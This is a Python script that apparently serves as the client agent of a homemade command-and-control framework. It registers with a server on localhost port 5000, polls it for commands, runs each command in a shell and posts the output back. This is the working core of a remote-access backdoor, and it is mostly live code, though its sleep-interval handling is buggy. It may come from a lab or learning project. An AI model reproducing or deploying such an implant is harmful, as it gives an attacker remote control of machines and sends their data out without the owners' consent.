import requests
import time
import subprocess



def register():
    print("Agent started\n")
    print("Registering Agent ... \n")
    response = requests.get(url="http://127.0.0.1:5000/agent/register")
    uuid = response.text
    print("Agent registered with: " + uuid)
    return uuid


uuid = register()


def get_commands():
    command = requests.get(url="http://127.0.0.1:5000/agent/" + uuid + "/command")
    cmd = command.text
    command = ""
    get_uuid = ""
    sleep = ""

    found = False
    uuid_found = False

    for c in cmd:
        if c == ";":
            found = True
            continue

        if c == ":":
            uuid_found = True
            continue

        if not found:
            command += c
        elif not uuid_found:
            get_uuid += c
        else:
            sleep += c

    return command, sleep

while True:
    first_sleep = False
    if not first_sleep:
        time.sleep(30)
        first_sleep = True
    else:
        time.sleep(sleep)

    cmd, sleep  = get_commands()
    print("Got: " + cmd)

    if cmd == "No command set":
        print("No command set")
        continue

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    requests.post(url=f"http://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"})

